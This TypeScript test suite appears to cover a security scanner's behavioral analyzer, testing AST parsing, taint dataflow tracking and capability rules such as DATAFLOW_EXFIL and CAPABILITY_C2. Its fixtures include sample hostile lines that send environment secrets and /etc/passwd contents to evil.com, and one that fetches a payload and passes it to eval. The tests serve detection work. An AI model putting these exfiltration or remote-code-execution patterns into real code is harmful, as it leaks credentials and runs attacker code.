import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { parseAndExtract } from '../core/analyzers/behavioral/ast-parser.js';
import { analyzeDataflows } from '../core/analyzers/behavioral/dataflow.js';
import { aggregateContext, type FileAnalysis } from '../core/analyzers/behavioral/context.js';
import { BehavioralAnalyzer } from '../core/analyzers/behavioral/index.js';
import { defaultPolicy, mergePolicy } from '../core/scan-policy.js';
import type { FileInfo } from '../scanner/file-walker.js';

// ── Helpers ──────────────────────────────────────────────────────────────

function makeFile(relativePath: string, content: string): FileInfo {
  const ext = '.' + relativePath.split('.').pop()!;
  return {
    path: `/scan-root/${relativePath}`,
    relativePath,
    content,
    extension: ext,
  };
}

// ── AST Parser Tests ─────────────────────────────────────────────────────

describe('AST Parser', () => {
  describe('imports', () => {
    it('should extract ES module imports', () => {
      const result = parseAndExtract(
        'import { exec } from "child_process";',
        'test.ts',
      );
      assert.ok(result);
      assert.ok(result.imports.some((i) => i.source === 'child_process'));
      assert.ok(result.imports.some((i) => i.imported.includes('exec')));
    });

    it('should extract require() calls', () => {
      const result = parseAndExtract(
        'const fs = require("fs");',
        'test.js',
      );
      assert.ok(result);
      assert.ok(result.imports.some((i) => i.source === 'fs'));
    });

    it('should extract default and namespace imports', () => {
      const result = parseAndExtract(
        'import axios from "axios";\nimport * as path from "path";',
        'test.ts',
      );
      assert.ok(result);
      assert.ok(result.imports.some((i) => i.imported.includes('default')));
      assert.ok(result.imports.some((i) => i.imported.includes('*')));
    });
  });

  describe('sinks', () => {
    it('should detect exec() call', () => {
      const result = parseAndExtract('exec("ls -la");', 'test.ts');
      assert.ok(result);
      assert.ok(result.sinks.some((s) => s.kind === 'exec' && s.name === 'exec'));
    });

    it('should detect spawn() call', () => {
      const result = parseAndExtract('spawn("node", ["script.js"]);', 'test.ts');
      assert.ok(result);
      assert.ok(result.sinks.some((s) => s.kind === 'spawn'));
    });

    it('should detect eval() call', () => {
      const result = parseAndExtract('eval(code);', 'test.ts');
      assert.ok(result);
      assert.ok(result.sinks.some((s) => s.kind === 'eval'));
    });

    it('should detect fetch() call', () => {
      const result = parseAndExtract('fetch("https://api.example.com");', 'test.ts');
      assert.ok(result);
      assert.ok(result.sinks.some((s) => s.kind === 'fetch'));
    });

    it('should detect dynamic import with variable', () => {
      const result = parseAndExtract('const mod = await import(modulePath);', 'test.ts');
      assert.ok(result);
      assert.ok(result.sinks.some((s) => s.name === 'import()'));
    });

    it('should NOT flag static string import()', () => {
      const result = parseAndExtract('const mod = await import("./safe.js");', 'test.ts');
      assert.ok(result);
      assert.ok(!result.sinks.some((s) => s.name === 'import()'));
    });
  });

  describe('sources', () => {
    it('should detect process.env access', () => {
      const result = parseAndExtract('const key = process.env.SECRET;', 'test.ts');
      assert.ok(result);
      assert.ok(result.sources.some((s) => s.kind === 'env'));
    });

    it('should detect fs.readFileSync', () => {
      const result = parseAndExtract('const data = fs.readFileSync("/etc/passwd");', 'test.ts');
      assert.ok(result);
      assert.ok(result.sources.some((s) => s.kind === 'fs_read'));
    });
  });

  describe('functions', () => {
    it('should extract function declarations', () => {
      const result = parseAndExtract(
        'function doSomething(a: string, b: number) { return a + b; }',
        'test.ts',
      );
      assert.ok(result);
      assert.ok(result.functions.some((f) => f.name === 'doSomething'));
      const fn = result.functions.find((f) => f.name === 'doSomething')!;
      assert.deepEqual(fn.params, ['a', 'b']);
    });

    it('should extract arrow functions assigned to variables', () => {
      const result = parseAndExtract(
        'const handler = (req: Request) => { return req.body; };',
        'test.ts',
      );
      assert.ok(result);
      assert.ok(result.functions.some((f) => f.name === 'handler'));
    });

    it('should detect exported functions', () => {
      const result = parseAndExtract(
        'export function publicFn() {}\nfunction privateFn() {}',
        'test.ts',
      );
      assert.ok(result);
      const pub = result.functions.find((f) => f.name === 'publicFn');
      const priv = result.functions.find((f) => f.name === 'privateFn');
      assert.ok(pub?.exported);
      assert.ok(!priv?.exported);
    });
  });

  describe('suspicious strings', () => {
    it('should detect external URLs', () => {
      const result = parseAndExtract(
        'const url = "https://evil.com/exfil";',
        'test.ts',
      );
      assert.ok(result);
      assert.ok(result.suspiciousStrings.some((s) => s.value.includes('evil.com')));
    });

    it('should NOT flag localhost URLs', () => {
      const result = parseAndExtract(
        'const url = "http://localhost:3000/api";',
        'test.ts',
      );
      assert.ok(result);
      assert.equal(result.suspiciousStrings.filter((s) => s.value.includes('localhost')).length, 0);
    });

    it('should detect credential file paths', () => {
      const result = parseAndExtract(
        'const path = "/home/user/.ssh/id_rsa";',
        'test.ts',
      );
      assert.ok(result);
      assert.ok(result.suspiciousStrings.some((s) => s.value.includes('.ssh')));
    });
  });

  describe('error handling', () => {
    it('should return null for unparseable content', () => {
      const result = parseAndExtract('this is not code {{{', 'test.ts');
      // @babel/parser with errorRecovery might still parse this
      // Either result is null or it parsed with errors — both are valid
      // The key is it should not throw
      assert.ok(result === null || typeof result === 'object');
    });

    it('should handle TypeScript files', () => {
      const ts = `
interface Config { key: string; }
const config: Config = { key: process.env.KEY! };
`;
      const result = parseAndExtract(ts, 'config.ts');
      assert.ok(result);
      assert.ok(result.sources.some((s) => s.kind === 'env'));
    });

    it('should handle JSX files', () => {
      const jsx = `
const App = () => <div>{process.env.REACT_APP_KEY}</div>;
`;
      const result = parseAndExtract(jsx, 'app.tsx');
      assert.ok(result);
    });
  });
});

// ── Dataflow Tests ───────────────────────────────────────────────────────

describe('Dataflow Tracker', () => {
  it('should detect env → fetch flow', () => {
    const code = `
const secret = process.env.API_KEY;
fetch("https://evil.com", { body: secret });
`;
    const extraction = parseAndExtract(code, 'test.ts')!;
    const flows = analyzeDataflows(extraction, code);
    assert.ok(flows.length > 0);
    assert.ok(flows.some((f) => f.source.kind === 'env' && f.sink.kind === 'fetch'));
  });

  it('should detect fetch → eval pattern', () => {
    const code = `
const resp = fetch("https://evil.com/payload");
resp.then(r => r.text()).then(code => eval(code));
`;
    const extraction = parseAndExtract(code, 'test.ts')!;
    const flows = analyzeDataflows(extraction, code);
    assert.ok(flows.length > 0);
  });

  it('should detect file read → network send', () => {
    const code = `
const data = fs.readFileSync("/etc/passwd", "utf-8");
fetch("https://evil.com", { body: data });
`;
    const extraction = parseAndExtract(code, 'test.ts')!;
    const flows = analyzeDataflows(extraction, code);
    assert.ok(flows.some((f) => f.source.kind === 'fs_read'));
  });

  it('should track taint through variable assignment', () => {
    const code = `
const secret = process.env.SECRET;
const payload = secret;
fetch("https://evil.com", { body: payload });
`;
    const extraction = parseAndExtract(code, 'test.ts')!;
    const flows = analyzeDataflows(extraction, code);
    assert.ok(flows.length > 0, 'Should detect flow through intermediate variable');
  });

  it('should not report flows for clean code', () => {
    const code = `
const x = 1 + 2;
console.log(x);
`;
    const extraction = parseAndExtract(code, 'test.ts')!;
    const flows = analyzeDataflows(extraction, code);
    assert.equal(flows.length, 0);
  });
});

// ── Context Aggregation Tests ────────────────────────────────────────────

describe('Context Aggregation', () => {
  it('should detect dangerous imports', () => {
    const extraction = parseAndExtract(
      'import { exec } from "child_process";',
      'test.ts',
    )!;
    const fa: FileAnalysis = { file: 'test.ts', extraction, flows: [] };
    const profile = aggregateContext([fa]);
    assert.ok(profile.dangerousImports.some((d) => d.module === 'child_process'));
    assert.ok(profile.capabilities.has('command_execution'));
  });

  it('should detect combined capabilities', () => {
    const file1 = parseAndExtract('import { exec } from "child_process";', 'a.ts')!;
    const file2 = parseAndExtract('import http from "http";', 'b.ts')!;
    const profile = aggregateContext([
      { file: 'a.ts', extraction: file1, flows: [] },
      { file: 'b.ts', extraction: file2, flows: [] },
    ]);
    assert.ok(profile.capabilities.has('command_execution'));
    assert.ok(profile.capabilities.has('network_access'));
  });

  it('should collect suspicious URLs', () => {
    const extraction = parseAndExtract(
      'const url = "https://evil.com/exfil";',
      'test.ts',
    )!;
    const profile = aggregateContext([
      { file: 'test.ts', extraction, flows: [] },
    ]);
    assert.ok(profile.suspiciousUrls.some((u) => u.url.includes('evil.com')));
  });
});

// ── BehavioralAnalyzer Integration ───────────────────────────────────────

describe('BehavioralAnalyzer', () => {
  const analyzer = new BehavioralAnalyzer();
  const policy = defaultPolicy();

  it('should be disabled when policy.analyzers.behavioral is false', () => {
    const disabledPolicy = mergePolicy(defaultPolicy(), {
      analyzers: { static: true, behavioral: false, llm: false },
    });
    assert.equal(analyzer.isEnabled(disabledPolicy), false);
  });

  it('should be enabled by default', () => {
    assert.equal(analyzer.isEnabled(policy), true);
  });

  it('should skip non-JS files', async () => {
    const files = [makeFile('config.yaml', 'key: value')];
    const findings = await analyzer.analyze({
      rootDir: '/scan-root',
      files,
      policy,
    });
    assert.equal(findings.length, 0);
  });

  it('should detect dataflow in TypeScript', async () => {
    const code = `
const secret = process.env.API_KEY;
fetch("https://evil.com", { body: secret });
`;
    const files = [makeFile('evil.ts', code)];
    const findings = await analyzer.analyze({
      rootDir: '/scan-root',
      files,
      policy,
    });
    assert.ok(findings.length > 0);
    assert.ok(findings.some((f) => f.rule_id === 'DATAFLOW_EXFIL'));
  });

  it('should detect exec + network capability combination', async () => {
    const code = `
import { exec } from "child_process";
import http from "http";
exec("ls");
http.request("https://example.com");
`;
    const files = [makeFile('c2.ts', code)];
    const findings = await analyzer.analyze({
      rootDir: '/scan-root',
      files,
      policy,
    });
    assert.ok(findings.some((f) => f.rule_id === 'CAPABILITY_C2'));
  });

  it('should detect eval usage', async () => {
    const code = 'const result = eval("1 + 1");';
    const files = [makeFile('eval.ts', code)];
    const findings = await analyzer.analyze({
      rootDir: '/scan-root',
      files,
      policy,
    });
    assert.ok(findings.some((f) => f.rule_id === 'CAPABILITY_EVAL'));
  });

  it('should produce findings with correct structure', async () => {
    const code = `
const secret = process.env.SECRET;
fetch("https://evil.com", { body: secret });
`;
    const files = [makeFile('test.ts', code)];
    const findings = await analyzer.analyze({
      rootDir: '/scan-root',
      files,
      policy,
    });
    assert.ok(findings.length > 0);
    const f = findings[0];
    assert.equal(f.analyzer, 'behavioral');
    assert.ok(f.confidence > 0 && f.confidence <= 1);
    assert.ok(f.location.file);
  });

  it('should not flag clean code', async () => {
    const code = `
export function add(a: number, b: number): number {
  return a + b;
}
`;
    const files = [makeFile('clean.ts', code)];
    const findings = await analyzer.analyze({
      rootDir: '/scan-root',
      files,
      policy,
    });
    assert.equal(findings.length, 0);
  });
});
